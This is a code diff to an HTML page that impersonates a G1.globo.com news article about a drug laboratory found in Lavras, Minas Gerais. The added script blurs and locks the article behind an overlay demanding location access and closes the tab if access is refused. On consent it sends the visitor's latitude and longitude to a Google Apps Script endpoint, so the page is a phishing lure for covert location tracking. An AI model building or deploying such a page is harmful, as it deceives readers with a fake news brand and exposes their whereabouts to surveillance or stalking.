@@ -1,21 +1,25 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>G1.globo.com - Notícias</title>
-
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background-color: #f5f5f5;
+      color: #222;
+      position: relative;
+      overflow: hidden;
     }
 
     header {
       background-color: #c4170c;
       padding: 10px 20px;
       color: white;
+      position: relative;
+      z-index: 1;
     }
 
     header h1 {
@@ -28,6 +32,8 @@
       color: white;
       padding: 8px 20px;
       font-size: 14px;
+      position: relative;
+      z-index: 1;
     }
 
     .container {
@@ -36,12 +42,15 @@
       background: white;
       padding: 20px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      position: relative;
+      z-index: 1;
     }
 
     .title {
       font-size: 26px;
       color: #c4170c;
       margin-bottom: 10px;
+      font-weight: bold;
     }
 
     .subinfo {
@@ -53,6 +62,7 @@
     .content {
       font-size: 18px;
       line-height: 1.6;
+      color: #333;
     }
 
     footer {
@@ -61,26 +71,35 @@
       text-align: center;
       padding: 10px;
       margin-top: 40px;
+      font-size: 14px;
+      position: relative;
+      z-index: 1;
     }
 
-    .blur-overlay {
+    /* Blur e bloqueio inicial */
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none; /* bloqueia interações */
+      user-select: none; /* bloqueia seleção */
+    }
+
+    /* Overlay que escurece e bloqueia */
+    #overlay {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(255,255,255,0.8);
-      backdrop-filter: blur(5px);
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 10;
       display: flex;
-      align-items: center;
       justify-content: center;
-      z-index: 1000;
+      align-items: center;
+      color: white;
+      font-size: 18px;
+      font-family: Arial, sans-serif;
+      user-select: none;
     }
   </style>
 </head>
-
 <body>
-  <div id="overlay" class="blur-overlay">
-    <p>Aguardando permissão de localização...</p>
-  </div>
 
   <header>
     <h1>G1</h1>
@@ -93,12 +112,13 @@
   <div class="container">
     <div class="title">Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265</div>
     <div class="subinfo">25/07/2025 15h30 - Atualizado há 2 horas</div>
+
     <div class="content">
       <p>Uma plantação de maconha e um laboratório de drogas foram encontrados pela polícia dentro de uma residência localizada na BR-265, na zona rural de Lavras, em Minas Gerais. A operação foi conduzida pela Polícia Militar após denúncias anônimas.</p>
-
       <p>Segundo as autoridades, no local foram apreendidas diversas mudas de cannabis, equipamentos para cultivo indoor e substâncias químicas usadas na fabricação de entorpecentes.</p>
-
       <p>O responsável pela residência foi preso em flagrante e encaminhado à delegacia da cidade. A Polícia Civil segue investigando o caso para identificar possíveis conexões com o tráfico regional.</p>
+      <p>Investigações continuam para desarticular toda a rede envolvida, visando reduzir o impacto do tráfico na região.</p>
+      <p>O caso também reacende o debate sobre políticas públicas de combate às drogas e a necessidade de ações integradas entre as forças de segurança.</p>
     </div>
   </div>
 
@@ -106,32 +126,49 @@
     © 2025 G1 - Todos os direitos reservados
   </footer>
 
-  <script>
-    // Solicita localização automaticamente
-    window.onload = () => {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            document.getElementById('overlay').style.display = 'none';
+  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
 
-            document.body.insertAdjacentHTML('beforeend',
-              `<div style="padding:20px; background:#eee; margin-top:20px;">
-                 <strong>Localização detectada:</strong><br>
-                 Latitude: ${lat}<br>
-                 Longitude: ${lon}
-               </div>`);
-          },
-          function (error) {
-            document.getElementById('overlay').innerHTML = "Permissão negada ou erro ao obter localização.";
-            console.warn("Erro ao obter localização:", error.message);
-          }
-        );
-      } else {
-        document.getElementById('overlay').innerHTML = "Geolocalização não é suportada pelo navegador.";
+  <script>
+    // Ao carregar a página, adiciona o blur e overlay
+    document.body.classList.add('blurred');
+
+    function liberarConteudo() {
+      // Remove blur e oculta overlay
+      document.body.classList.remove('blurred');
+      document.getElementById('overlay').style.display = 'none';
+    }
+
+    window.addEventListener('load', () => {
+      if (!navigator.geolocation) {
+        // Não suporta geolocalização, fecha aba
+        window.close();
+        return;
       }
-    };
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // Envia dados para Google Script
+        const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
+        const payload = { latitude: lat, longitude: lon };
+        try {
+          await fetch(url, {
+            method: "POST",
+            body: JSON.stringify(payload)
+          });
+        } catch (e) {
+          console.warn("Erro ao enviar localização:", e);
+        }
+
+        liberarConteudo();
+
+      }, (error) => {
+        // Usuário negou ou erro ao obter localização - fecha aba
+        window.close();
+      });
+    });
   </script>
+
 </body>
 </html>
